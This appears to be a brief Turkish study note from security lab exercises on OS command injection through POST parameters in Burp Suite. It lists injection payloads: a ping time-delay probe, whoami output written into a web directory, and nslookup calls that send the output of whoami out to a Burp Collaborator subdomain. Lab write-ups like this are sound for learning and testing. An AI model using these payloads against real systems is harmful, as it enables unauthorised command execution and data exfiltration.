Sayfa içerisinde veya Burp Suite üzerinde gönderilen POST isteklerinde komut çalıştırma işlemleridir.

#### TEMEL OLARAK:

![[Pasted image 20250316144314.png]]

![[Pasted image 20250316144323.png]]

#### Tabi bu işlerin de ilerlemiş versiyonları mevcuttur.

##### email=x||ping+-c+10+127.0.0.1||      şeklinde bir payload ile time-delay olursa da command injection olduğunu anlarız.

#### İşlerin biraz daha zor hâlini düşünelim.

### email=||whoami>/var/www/images/output.txt||
şeklinde bir payload gönderiyoruz. 
Bir submit gönderme kısmında:
![[Pasted image 20250316145108.png]]

/var/www/images/ kısmını bize labın ipucu kısmında açıklama kısmında bize vermişlerdi.
Yani bize sayfada gösterilen dosyalar bu dizin içerisinde mevcut. Biz de istediğimiz bilgiyi o dosyanın içerisine gönderdik.

### Biraz Daha Zor Düşünürsek:
email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||
şeklindeki payload'ımız var. Collaborator üzerinde linki yapıştırıp gönderince 
![[Pasted image 20250316145707.png]]

Bu şekilde lab çözülmüş olur.

### SON LAB OLARAK DA:
`||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||`

şeklinde payload'ımız var.  Buraya collaborator'den aldığımız linki yapıştırdıktan sonra DNS sonuçları kısmında cevabı görüyoruz.

